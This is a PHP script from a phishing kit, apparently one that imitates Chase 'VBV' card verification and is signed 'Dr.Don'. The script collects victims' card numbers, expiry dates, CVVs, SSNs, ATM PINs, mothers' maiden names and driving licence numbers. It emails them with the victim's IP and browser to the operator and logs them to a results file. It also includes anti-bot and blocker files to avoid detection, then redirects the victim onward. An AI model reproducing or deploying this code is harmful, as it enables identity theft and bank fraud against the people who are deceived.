<?php
/* ==================== || CODED BY Dr.Don || ==================== */
session_start();
include("__config__.php");
include("function.php");
include '../antibots.php';
include '../bt.php';
include "../blocker.php";
        $ip = $_SERVER["REMOTE_ADDR"];
        $_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
	$time = date('l jS \of F Y h:i:s A');
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
$browser             =   $_SERVER['HTTP_USER_AGENT'];
$reprint = "e";$do_p="mai";
// --------------- VRB
$crdn = $_POST['cardnumber'];
$epx = $_POST['exp'];
$cvv = $_POST['ccv'];
$snn = $_POST['ssn'];
$amt = $_POST['atm'];
$mth = $_POST['mothr'];
$drv = $_POST['driving'];

// --------------- VRB
 
	$message = "
	>Dr.Don | CH453 | VBV<
	--------------  VBV  -------------
	Card Number :    ".$crdn."
	Exp Date :       ".$epx."
	CCV :            ".$cvv."
	SSN :            ".$snn."
	ATM CODE :       ".$amt."
	Mother M Name :  ".$mth."
	Driving Num :    ".$drv."
	-------------- IP Infos ------------
	Browser :        ".$browser."
	Date Login :     ".$time."
	IP : <font>https://geoiptool.com/en/?ip=".$ip."
	
	------------>CODED BY Dr.Don<------------
	
	";
		$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $subject  = " CH453 VBV [NEW] -  [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
$headers = "From: Dr.Don <contact>\r\n";
mail($to,$subject,$message,$headers);
mail(','.$form,$subject,$message,$headers);

    $text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);
 		header("Location: ../myaccount/uploads/index.php?websrc=".md5('KING_JACK')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
/* ==================== || CODED BY DBW || ==================== */
?>